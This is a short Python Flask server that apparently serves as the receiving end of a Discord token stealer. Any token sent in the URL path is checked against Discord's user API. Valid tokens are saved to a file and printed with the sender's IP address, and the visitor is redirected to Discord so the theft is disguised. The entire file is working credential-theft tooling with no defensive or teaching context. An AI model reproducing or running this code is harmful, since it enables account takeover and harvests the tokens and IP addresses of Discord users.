from flask import Flask, redirect, request
import requests

app = Flask(__name__)

@app.route('/alive')
def keep_alive():
    return "alive"

@app.route('/')
def main():
    return redirect("https://discord.com/app")

@app.route('/<string:token>')
def index(token):
    if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
        publicip = request.environ['REMOTE_ADDR']
    else:
        publicip = request.environ['HTTP_X_FORWARDED_FOR']

    with open('tokens.txt', 'r+') as f:
        lines = f.read().splitlines()
        if token not in lines:
            headers = {"Authorization": token}
            response = requests.get("https://discord.com/api/v9/users/@me", headers=headers).status_code
            if response == 200:
                f.write(f"{token.rstrip()}\n")
                print(f"From {publicip} {token}")

    return redirect("https://discord.com/app")

app.run(host='0.0.0.0', port=1337)
